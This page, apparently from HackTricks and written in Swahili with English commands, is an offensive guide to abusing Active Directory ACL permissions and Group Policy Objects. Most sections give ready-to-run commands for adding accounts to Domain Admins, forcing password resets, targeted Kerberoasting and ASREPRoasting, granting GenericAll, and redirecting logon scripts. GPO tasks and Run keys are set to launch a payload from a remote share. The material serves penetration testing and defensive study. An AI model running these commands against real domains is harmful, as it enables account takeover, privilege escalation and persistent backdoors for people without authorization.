# Kutumia vibaya Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni hasa muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala za asili.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Haki za GenericAll kwa Mtumiaji**

Haki hii inampa mdukuzi udhibiti kamili wa akaunti ya mtumiaji lengwa. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mdukuzi anaweza:

- **Badili nenosiri la mtumiaji lengwa**: Kwa kutumia `net user <username> <password> /domain`, mdukuzi anaweza kuweka upya nenosiri la mtumiaji.
- **Targeted Kerberoasting**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iwe kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja ticket-granting ticket (TGT) hashes.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Iliyolengwa ASREPRoasting**: Zima pre-authentication kwa mtumiaji, ukifanya akaunti yao iwe nyeti kwa ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Rights on Group**

Haki hii inamruhusu mshambulizi kubadilisha uanachama wa vikundi ikiwa ana haki za `GenericAll` kwenye kikundi kama `Domain Admins`. Baada ya kutambua distinguished name ya kikundi kwa kutumia `Get-NetGroup`, mshambulizi anaweza:

- **Kujiongeza kwenye kikundi cha Domain Admins**: Hii inaweza kufanywa kwa amri za moja kwa moja au kwa kutumia moduli kama Active Directory au PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Kutoka Linux, unaweza pia kutumia BloodyAD kujiweka katika vikundi vyovyote unapokuwa na uanachama wa GenericAll/Write juu yao. Ikiwa kikundi lengwa kimewekwa ndani ya “Remote Management Users”, utapata mara moja ufikiaji wa WinRM kwenye hosts zinazoheshimu kikundi hicho:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kushikilia vibali hivi kwenye objekti ya kompyuta au akaunti ya mtumiaji kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa objekti ya kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia vibali hivyo kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwa objekti zote za kikundi maalum (kwa mfano, `Domain Admins`), wanaweza:

- **Kujiweka kwenye kikundi la Domain Admins**: Inawezekana kupitia kuunganisha amri za `net user` na `Add-NetGroupUser`; njia hii inawezesha kuinua vibali ndani ya domain.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Haki hii inawawezesha washambuliaji kujiongezea kwenye vikundi maalum, kama `Domain Admins`, kupitia amri zinazobadilisha uanachama wa kikundi moja kwa moja. Kutumia mfululizo wa amri ufuatao kunaruhusu kujiongezea:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Ruhusa inayofanana, hii inawawezesha wadukuzi kuongeza wao wenyewe moja kwa moja kwenye vikundi kwa kubadilisha sifa za vikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa ruhusa hii hufanywa kwa:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kumiliki `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu reset ya nywila bila kujua nywila ya sasa. Uthibitisho wa haki hii na matumizi yake yanaweza kufanywa kupitia PowerShell au zana mbadala za command-line, zikitoa njia kadhaa za kurudisha nywila za mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na one-liners kwa mazingira yasiyo na mwingiliano. Amri zinatoka kwa mwito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, zikionesha utofauti wa njia za mashambulizi.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Kundi**

Ikiwa mshambuliaji atagundua kwamba ana haki za `WriteOwner` juu ya kundi, anaweza kubadilisha umiliki wa kundi huo kwa yeye mwenyewe. Hii ina athari kubwa hasa wakati kundi kinachozungumziwa ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana zaidi juu ya sifa za kundi na uanachama. Mchakato unahusisha kutambua kitu sahihi kupitia `Get-ObjectAcl` kisha kutumia `Set-DomainObjectOwner` kubadilisha mwenye umiliki, ama kwa SID au kwa jina.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite kwa User**

Idhini hii inamruhusu mshambuliaji kubadilisha sifa za User. Hasa, kwa kupata ruhusa ya `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya logon script ya User ili kuendesha script ya kibaya wakati wa kuingia kwa User. Hii inafikiwa kwa kutumia amri ya `Set-ADObject` kusasisha sifa ya `scriptpath` ya User lengwa ili kuielekeza kwenye script ya mshambuliaji.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa kikundi, kama kujiongeza wao wenyewe au watumiaji wengine katika vikundi maalum. Mchakato huu unahusisha kuunda credential object, kuitumia kuongeza au kuondoa watumiaji kutoka kwa kikundi, na kuthibitisha mabadiliko ya uanachama kwa kutumia amri za PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Kumiliki kitu cha AD na kuwa na ruhusa za `WriteDACL` juu yake kunamwezesha mshambuliaji kujipa ruhusa za `GenericAll` kwa kitu hicho. Hii inafikiwa kupitia manipulisho ya ADSI, ikiruhusu udhibiti kamili wa kitu hicho na uwezo wa kubadilisha uanachama wake wa vikundi. Hata hivyo, kunakuwapo vikwazo wakati wa kujaribu kuchukua faida ya ruhusa hizi kwa kutumia cmdlets za Active Directory `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Ukurudishaji kwenye Domain (DCSync)**

Shambulio la DCSync linatumia ruhusa maalum za replication kwenye domain ili kujiga Domain Controller na kusanifisha data, ikijumuisha nywila za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, kuruhusu washambuliaji kutoa taarifa nyeti kutoka mazingira ya AD bila kupata moja kwa moja kwa Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Utoaji wa GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Utoaji wa GPO

Ufikiaji uliotolewa kusimamia Group Policy Objects (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za usimamizi wa GPO, anaweza kuwa na vibali kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumika vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Kukusanya Ruhusa za GPO

Ili kubaini GPO zilizopangwa vibaya, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPO ambazo mtumiaji fulani ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta ambazo Sera Fulani Imetumika**: Inawezekana kubaini ni kompyuta zipi GPO maalum inawahusu, kusaidia kuelewa wigo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zilizotekelezwa kwa Kompyuta Fulani**: Ili kuona sera gani zimewekwa kwa kompyuta fulani, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs Ambazo Sera Fulani Imewagusa**: Kutambua organizational units (OUs) zilizoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`

Unaweza pia kutumia chombo [**GPOHound**](https://github.com/cogiceo/GPOHound) kuorodhesha GPO na kutafuta matatizo ndani yao.

### Kutumia vibaya GPO - New-GPOImmediateTask

GPO zilizopangwa vibaya zinaweza kutumiwa kuendesha code, kwa mfano, kwa kuunda immediate scheduled task. Hii inaweza kutumika kuongeza mtumiaji kwenye local administrators group kwenye mashine zilizoathirika, hivyo kuinua vibali kwa kiasi kikubwa:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Module ya GroupPolicy, ikiwa imewekwa, inaruhusu kuunda na kuunganisha GPOs mpya, na kuweka mapendeleo, kama vile registry values, ili kutekeleza backdoors kwenye kompyuta zilizoathiriwa. Njia hii inahitaji GPO kusasishwa na mtumiaji aingie kwenye kompyuta kwa ajili ya utekelezaji:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse inatoa mbinu ya kutumia vibaya GPO zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila hitaji la kuunda GPO mpya. Zana hii inahitaji marekebisho ya GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Lazimisha Sasisho la Sera

Sasisho za GPO kwa kawaida hufanyika takriban kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kwamba mabadiliko yoyote kwa GPOs yanatekelezwa bila kusubiri mzunguko ujao wa sasisho la kiotomatiki.

### Ndani ya Mfumo

Baada ya kuchunguza Majukumu yaliyopangwa kwa GPO fulani, kama `Misconfigured Policy`, inaweza kuthibitishwa kwamba majukumu kama `evilTask` yameongezwa. Majukumu haya huundwa kupitia scripti au zana za command-line zinazolenga kubadilisha tabia ya mfumo au kuinua ruhusa.

Muundo wa kazi, kama inavyoonyeshwa katika faili ya usanidi ya XML iliyotengenezwa na `New-GPOImmediateTask`, unaeleza maelezo maalum ya kazi iliyopangwa - ikiwa ni pamoja na amri iliyotakiwa kutekelezwa na vichocheo vyake. Faili hii inaonyesha jinsi Majukumu yaliyopangwa yanavyofafanuliwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza amri au scripti yoyote kama sehemu ya utekelezaji wa sera.

### Watumiaji na Vikundi

GPOs pia huruhusu udhibiti wa uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Users and Groups moja kwa moja, washambuliaji wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka, kama kikundi cha eneo cha `administrators`. Hii inatokea kupitia ugawaji (delegation) wa ruhusa za usimamizi wa GPO, ambao unaruhusu mabadiliko ya faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanidi ya XML kwa Users and Groups inaeleza jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza rekodi kwenye faili hii, watumiaji maalum wanaweza kupewa ruhusa zilizoongezwa kwenye mifumo iliyoharibika. Njia hii inatoa njia ya moja kwa moja ya kuinua viwango vya ruhusa kupitia udanganyifu wa GPO.

Zaidi ya hayo, mbinu nyingine za kutekeleza msimbo au kudumisha upatikanaji, kama kutumia scripti za kuingia/kuondoka (logon/logoff), kubadilisha vitufe vya registry kwa ajili ya autoruns, kusakinisha programu kupitia faili za .msi, au kuhariri usanidi wa services, pia zinaweza kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha upatikanaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPOs.

## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
